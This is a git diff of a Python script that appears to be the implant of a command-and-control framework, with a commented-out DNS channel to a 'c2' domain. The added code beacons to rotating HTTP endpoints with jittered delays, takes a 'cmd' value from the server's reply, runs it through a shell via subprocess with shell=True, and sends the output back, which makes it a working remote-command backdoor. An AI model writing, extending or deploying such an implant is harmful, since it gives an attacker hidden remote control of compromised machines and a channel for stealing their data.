@@ -1,45 +1,64 @@
-import re
-import requests
-import time
-from helpers import wrap, unwrap, delay
-from classes import HTTPTransport
 import random
+import subprocess
+import os
 
-DWELL_TIME = 10
+
+# os.environ['GRAYMAN_DEBUG'] = "1"
+# os.environ['GRAYMAN_VERBOSE'] = "1"
+
+from helpers import delay, verbose, debug
+from classes import HTTPTransport, DNSTransport
+
+
+DWELL_TIME = 3
 URL = "https://shyft.us"
-PROXIES = list()
-
-
+PROXIES = tuple()
 
 
 def operate():
-	t1 = HTTPTransport(server="http://localhost/ep1", proxies=PROXIES)
-	t2 = HTTPTransport(server="http://localhost/ep2", proxies=PROXIES)
-	t3 = HTTPTransport(server="http://localhost/ep3", proxies=PROXIES)
-	transports = [t1,t2,t3]
-	while True:
-	
-		try:
-			transport = random.choice(transports) 
-			resp = transport.recv()
-			print(resp.text)
-		except requests.exceptions.ConnectionError as e:
-			print(e)
-		except BaseException as e:
-			print(e)
-		
+    print("Operating...")
+    global DWELL_TIME
+
+    t1 = HTTPTransport(server="http://localhost:5000/ep1", proxies=PROXIES)
+    t2 = HTTPTransport(server="http://localhost:5000/ep2", proxies=PROXIES)
+    t3 = HTTPTransport(server="http://localhost:5000/ep3", proxies=PROXIES)
+    # t4 = DNSTransport(domain="c2.shyft.us")
+    transports = [t1, t2, t3]
+    while True:
+        # print show running config
+        verbose(f"{DWELL_TIME=} {PROXIES=}")
+
+        # Get command
+        try:
+            transport = random.choice(transports)
+            resp = transport.recv()
+            # print(resp)
+            cmd = resp.get("cmd")
+            DWELL_TIME = int(resp.get("dwell_time", DWELL_TIME))
+            ret = subprocess.run(cmd, capture_output=True, shell=True).stdout.decode()
+
+        except BaseException as e:
+            debug(e)
+
+        # wait some time
+        jitter = DWELL_TIME // 4
+        delay(DWELL_TIME, jitter_amount=jitter)
+
+        # send results back
+        try:
+            transport = random.choice(transports)
+            resp = transport.send(ret)
+
+        except BaseException as e:
+            debug(e)
+
+        # wait some more time
+        jitter = DWELL_TIME // 4
+        delay(DWELL_TIME, jitter_amount=jitter)
 
 
-
-
-
-
-
-		jitter = DWELL_TIME // 4 
-		delay(DWELL_TIME, jitter_amount=jitter) 
-
-if __name__ == '__main__':
-	try:
-		operate()
-	except KeyboardInterrupt as e:
-		print('shutting down', e)
+if __name__ == "__main__":
+    try:
+        operate()
+    except KeyboardInterrupt as e:
+        print("\nShutting down...", e)
